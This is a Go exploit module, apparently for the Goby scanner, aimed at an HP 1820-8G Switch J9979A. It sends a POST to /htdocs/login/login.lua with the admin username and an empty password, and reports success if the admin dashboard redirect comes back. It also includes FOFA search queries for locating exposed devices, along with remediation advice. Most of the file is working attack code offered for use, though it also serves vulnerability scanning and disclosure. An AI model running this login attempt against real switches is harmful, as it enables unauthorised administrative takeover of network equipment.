package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HP 1820-8G Switch J9979A  login.lua file Dafult Password Vulnerability",
    "Description": "<p>HP 1820-8G Switch J9979A is a Switch of network by Hewlett-Packard Development Company, L.P. </p><p>There is a dafult password vulnerability in HP 1820-8G Switch J9979A .Attacker can use the vulnerability to get administrative authority</p>",
    "Impact": "<p>HP 1820-8G Switch J9979A  Dafult Password</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "HP 1820-8G Switch J9979A",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "HP 1820-8G Switch J9979A login.lua 文件默认口令漏洞",
            "Product": "HP 1820-8G Switch J9979A",
            "Description": "<p>HP 1820-8G Switch J9979A 是惠普公司的一款交换机。</p><p>HP 1820-8G Switch J9979A 存在默认口令漏洞。攻击者可利用该漏洞登录后台，获得管理员权限。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>HP 1820-8G Switch J9979A 是惠普公司的一款交换机，攻击者可利用该漏洞登录后台，获得管理员权限。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "HP 1820-8G Switch J9979A  login.lua file Dafult Password Vulnerability",
            "Product": "HP 1820-8G Switch J9979A",
            "Description": "<p>HP 1820-8G Switch J9979A is a Switch of network by Hewlett-Packard Development Company, L.P. </p><p>There is a dafult password vulnerability in HP 1820-8G Switch J9979A .Attacker can use the vulnerability to get administrative authority</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>HP 1820-8G Switch J9979A  Dafult Password</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "body=\"HP 1820-8G Switch J9979A\"",
    "GobyQuery": "body=\"HP 1820-8G Switch J9979A\"",
    "Author": "AnMing",
    "Homepage": "https://www.hp.com/",
    "DisclosureDate": "2022-04-06",
    "References": [
        "https://support.hpe.com/hpesc/public/docDisplay?docId=a00077779en_us&docLocale=en_US"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "username",
            "type": "select",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10489"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/htdocs/login/login.lua"
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", u.HostInfo)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Data = "username=admin&password="
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"redirect\": \"/htdocs/pages/main/main.lsp\"") && strings.Contains(resp.Utf8Html, "\"error\": \"\"") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/htdocs/login/login.lua"
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", expResult.HostInfo.HostInfo)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Data = "username=admin&password="
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"redirect\": \"/htdocs/pages/main/main.lsp\"") && strings.Contains(resp.Utf8Html, "\"error\": \"\"") {
					expResult.Success = true
					expResult.Output = "Plase use \"admin\" to login, and the passwrod is none!"
				}
			}
			return expResult
		},
	))
}
